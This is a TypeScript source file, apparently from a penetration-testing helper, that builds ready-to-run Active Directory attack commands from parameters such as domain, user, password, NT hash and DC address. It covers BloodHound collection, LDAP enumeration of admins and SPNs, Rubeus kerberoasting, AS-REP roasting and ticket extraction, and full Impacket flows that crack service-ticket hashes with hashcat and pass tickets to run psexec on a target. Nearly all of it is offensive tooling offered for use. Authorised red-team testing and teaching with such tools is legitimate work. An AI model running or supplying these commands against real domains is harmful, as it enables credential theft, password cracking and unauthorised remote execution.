import type { Tool } from '../../types';
import { v } from '../../lib/auth';

export const kerberosTools: Tool[] = [
  {
    id: 'bloodhound',
    name: 'BloodHound',
    category: 'kerberos',
    homepage: 'https://github.com/BloodHoundAD/BloodHound',
    description: 'AD 关系图谱分析工具',
    commands: [
      {
        id: 'bloodhound-python',
        title: 'BloodHound Python 采集器',
        build: (p) => {
          const domain = v(p.domain, 'DOMAIN');
          const user = v(p.username, 'USER');
          const dcIP = v(p.dcIP, 'DC_IP');

          let auth = '';
          switch (p.authMode) {
            case 'password':
              auth = `-p ${v(p.password, 'PASSWORD')}`;
              break;
            case 'hash':
              auth = `--hashes :${v(p.ntHash, 'NTHASH')}`;
              break;
            case 'kerberos':
              auth = `-k`;
              break;
            case 'aeskey':
              auth = `--aesKey ${v(p.aesKey, 'AESKEY')} -k`;
              break;
          }

          return `bloodhound-python -u ${user} ${auth} -d ${domain} -ns ${dcIP} -c All --zip`;
        },
      },
      {
        id: 'bloodhound-sharphound',
        title: 'SharpHound (Windows)',
        description: '在目标主机上运行',
        build: (p) => `SharpHound.exe -c All --zipfilename ${v(p.bloodhoundZip, 'OUTPUT.zip')}`,
      },
    ],
  },
  {
    id: 'kerberos-tools',
    name: 'Kerberos 工具',
    category: 'kerberos',
    homepage: 'https://web.mit.edu/kerberos/',
    description: 'Kerberos 票据操作',
    commands: [
      {
        id: 'kinit',
        title: 'kinit 获取 TGT',
        build: (p) => `kinit ${v(p.username, 'USER')}@${v(p.domain, 'DOMAIN').toUpperCase()}`,
      },
      {
        id: 'klist',
        title: 'klist 查看票据',
        build: () => `klist`,
      },
      {
        id: 'kdestroy',
        title: 'kdestroy 销毁票据',
        build: () => `kdestroy`,
      },
      {
        id: 'krb5-ccache-export',
        title: '导出 TGT 环境变量',
        description: '用于 Impacket 工具的 -k 参数',
        build: (p) => `export KRB5CCNAME=${v(p.ccachePath, 'CCACHE_PATH')}`,
      },
    ],
  },
  {
    id: 'ldapsearch',
    name: 'ldapsearch',
    category: 'kerberos',
    homepage: 'https://linux.die.net/man/1/ldapsearch',
    description: 'LDAP 查询工具',
    commands: [
      {
        id: 'ldapsearch-all-users',
        title: '查询所有域用户',
        build: (p) => {
          const dcFQDN = v(p.dcFQDN || p.dcIP, 'DC');
          const domain = v(p.domain, 'DOMAIN');
          const user = v(p.username, 'USER');
          const password = v(p.password, 'PASSWORD');
          const baseDN = domain.split('.').map(s => `dc=${s}`).join(',');

          return `ldapsearch -x -H ldap://${dcFQDN} -D "${user}@${domain}" -w ${password} -b "${baseDN}" "(objectClass=user)"`;
        },
      },
      {
        id: 'ldapsearch-admins',
        title: '查询域管理员组',
        build: (p) => {
          const dcFQDN = v(p.dcFQDN || p.dcIP, 'DC');
          const domain = v(p.domain, 'DOMAIN');
          const user = v(p.username, 'USER');
          const password = v(p.password, 'PASSWORD');
          const baseDN = domain.split('.').map(s => `dc=${s}`).join(',');

          return `ldapsearch -x -H ldap://${dcFQDN} -D "${user}@${domain}" -w ${password} -b "${baseDN}" "(memberOf=CN=Domain Admins,CN=Users,${baseDN})"`;
        },
      },
      {
        id: 'ldapsearch-spn',
        title: '查询 SPN (Kerberoasting)',
        build: (p) => {
          const dcFQDN = v(p.dcFQDN || p.dcIP, 'DC');
          const domain = v(p.domain, 'DOMAIN');
          const user = v(p.username, 'USER');
          const password = v(p.password, 'PASSWORD');
          const baseDN = domain.split('.').map(s => `dc=${s}`).join(',');

          return `ldapsearch -x -H ldap://${dcFQDN} -D "${user}@${domain}" -w ${password} -b "${baseDN}" "(&(servicePrincipalName=*)(objectCategory=user))"`;
        },
      },
    ],
  },
  {
    id: 'rubeus',
    name: 'Rubeus',
    category: 'kerberos',
    homepage: 'https://github.com/GhostPack/Rubeus',
    description: 'Windows Kerberos 攻击工具',
    commands: [
      {
        id: 'rubeus-kerberoast',
        title: 'Rubeus Kerberoasting',
        build: () => `Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt`,
      },
      {
        id: 'rubeus-asreproast',
        title: 'Rubeus AS-REP Roasting',
        build: () => `Rubeus.exe asreproast /outfile:asrep_hashes.txt`,
      },
      {
        id: 'rubeus-tgtdeleg',
        title: 'Rubeus 提取 TGT (tgtdeleg)',
        build: () => `Rubeus.exe tgtdeleg`,
      },
      {
        id: 'rubeus-ptt',
        title: 'Rubeus Pass-the-Ticket',
        build: () => `Rubeus.exe ptt /ticket:ticket.kirbi`,
      },
    ],
  },
  {
    id: 'kerberos-attack-flow',
    name: 'Kerberos 攻击流程',
    category: 'kerberos',
    description: '常见 Kerberos 攻击完整流程说明',
    commands: [
      {
        id: 'kerberoast-flow',
        title: 'Kerberoasting 完整流程',
        description: '1. 枚举 SPN -> 2. 请求 TGS -> 3. 离线破解',
        build: (p) => `# 1. 枚举 SPN\nimpacket-GetUserSPNs ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}:${v(p.password, 'PASSWORD')} -dc-ip ${v(p.dcIP, 'DC_IP')}\n\n# 2. 请求票据\nimpacket-GetUserSPNs ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}:${v(p.password, 'PASSWORD')} -dc-ip ${v(p.dcIP, 'DC_IP')} -request -outputfile hashes.txt\n\n# 3. hashcat 破解\nhashcat -m 13100 hashes.txt wordlist.txt`,
      },
      {
        id: 'asrep-flow',
        title: 'AS-REP Roasting 完整流程',
        description: '1. 枚举无预认证用户 -> 2. 离线破解',
        build: (p) => `# 1. 枚举\nimpacket-GetNPUsers ${v(p.domain, 'DOMAIN')}/ -usersfile users.txt -dc-ip ${v(p.dcIP, 'DC_IP')} -format hashcat -outputfile asrep.txt\n\n# 2. hashcat 破解\nhashcat -m 18200 asrep.txt wordlist.txt`,
      },
      {
        id: 'ptt-flow',
        title: 'Pass-the-Ticket 完整流程',
        description: '1. 获取 TGT -> 2. 设置环境变量 -> 3. 使用票据',
        build: (p) => `# 1. 获取 TGT\nimpacket-getTGT ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')} -hashes :${v(p.ntHash, 'NTHASH')} -dc-ip ${v(p.dcIP, 'DC_IP')}\n\n# 2. 设置环境变量\nexport KRB5CCNAME=${v(p.username, 'USER')}.ccache\n\n# 3. 使用 Kerberos 认证执行命令\nimpacket-psexec ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}@${v(p.targetHost, 'TARGET')} -k -no-pass`,
      },
    ],
  },
];
